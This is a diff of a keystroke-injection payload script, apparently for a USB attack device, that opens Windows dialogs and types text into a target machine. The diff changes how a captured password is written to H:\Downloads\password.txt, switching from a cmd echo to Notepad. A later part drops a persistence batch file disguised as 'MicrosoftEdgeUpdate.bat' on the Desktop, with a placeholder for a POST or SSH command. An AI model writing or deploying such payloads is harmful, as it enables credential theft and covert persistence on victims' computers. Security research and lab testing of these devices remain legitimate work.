@@ -111,18 +111,20 @@ log INFO "STEP 5: Cleaned password to inject: ${CLEAN_KEYS}"
 Q DELAY 2000
 Q GUI r
 Q DELAY 600
-Q STRING cmd
+Q STRING notepad H:\Downloads\password.txt
 Q ENTER
-Q DELAY 600
-Q STRING cd H:\Downloads
+Q DELAY 1200
+# If file doesn't exist, Notepad asks "Create new file?" — confirm with Enter
 Q ENTER
-Q DELAY 200
-Q STRING echo ${CLEAN_KEYS} > password.txt
-Q ENTER
-Q DELAY 200
-Q STRING exit
-Q ENTER
-log INFO "STEP 5 OK: password.txt written to H:\\Downloads"
+Q DELAY 800
+# Type the cleaned password into the blank Notepad window
+Q STRING ${CLEAN_KEYS}
+Q DELAY 300
+# Ctrl+S to save
+Q CTRL s
+Q DELAY 500
+Q ALT F4
+log INFO "STEP 5 OK: password.txt saved to H:\\Downloads via Notepad"
 
 #####################Persistence Batch File on H:\Desktop##################
 # Drops a .bat file directly onto H:\Desktop using plain cmd echo — no quotes,
@@ -136,7 +138,7 @@ Q DELAY 600
 Q STRING cmd
 Q ENTER
 Q DELAY 400
-Q STRING cd /d H:\Desktop
+Q STRING cd H:\Desktop
 Q ENTER
 Q DELAY 200
 Q STRING echo "This could be a POST or SSH command" > MicrosoftEdgeUpdate.bat
